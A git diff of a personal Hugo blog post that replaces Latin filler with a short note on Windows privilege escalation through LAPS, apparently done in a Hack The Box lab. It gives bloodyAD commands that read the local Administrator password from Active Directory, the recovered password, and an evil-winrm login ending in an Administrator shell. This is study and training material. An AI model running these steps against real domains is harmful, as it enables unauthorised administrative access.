@@ -1,6 +1,6 @@
 ---
-title: "Placeholder Text"
-date: 2021-04-03T22:41:10+05:30
+title: "Windows Privilege Escalation - LAPS"
+date: 2025-04-03T22:41:10+05:30
 draft: false
 github_link: "https://github.com/gurusabarish/hugo-profile"
 author: "Gurusabarish"
@@ -13,30 +13,49 @@ description: ""
 toc: 
 ---
 
-Lorem est tota propiore conpellat pectoribus de pectora summo.
+# Windows Privilege Escalation - LAPS
 
-Redit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.
+Local Administrator Password Solution (LAPS) is a feature in Windows used to backup Administrator password (What is LAPS?).
 
-  1. Exierant elisi ambit vivere dedere
-  2. Duce pollice
-  3. Eris modo
-  4. Spargitque ferrea quos palude
+## Location LAPS file
 
-Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.
+```
+dir "C:\Program Files\LAPS\CSE"
+```
 
-  1. Comas hunc haec pietate fetum procerum dixit
-  2. Post torum vates letum Tiresia
-  3. Flumen querellas
-  4. Arcanaque montibus omnes
-  5. Quidem et
+## Retrieve Administrator password
 
-# Vagus elidunt
+Using bloodyAD tool we can retrieve the password.
 
-[The Van de Graaf Canon](https://en.wikipedia.org/wiki/Canons_of_page_construction#Van_de_Graaf_canon)
+Installation: 
 
-## Mane refeci capiebant unda mulcebat
-Victa caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.
+- git clone --depth 1 https://github.com/CravateRouge/autobloody
+- pip install .
 
-Iubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.
+```
+┌─[eu-dedivip-2]─[10.10.14.219]─[garrisec@htb-9ij5kp5ced]─[~/bloodyAD]
+└──╼ [★]$ bloodyAD -u svc_deploy -d bloody.lab -p 'E3R$Q62^12p7PLlC%KWaxuaV' --host 10.129.207.26 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 
-Eurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+ms-Mcs-AdmPwd: 6af%4)3.!G!ghhi.T7[m[r3&
+ms-Mcs-AdmPwdExpirationTime: 133875940421676222
+```
+
+## Login with password
+
+```
+┌─[eu-dedivip-2]─[10.10.14.219]─[garrisec@htb-9ij5kp5ced]─[~/bloodyAD]
+└──╼ [★]$ evil-winrm -u Administrator -p '6af%4)3.!G!ghhi.T7[m[r3&' -i 10.129.207.26 -S
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
+```
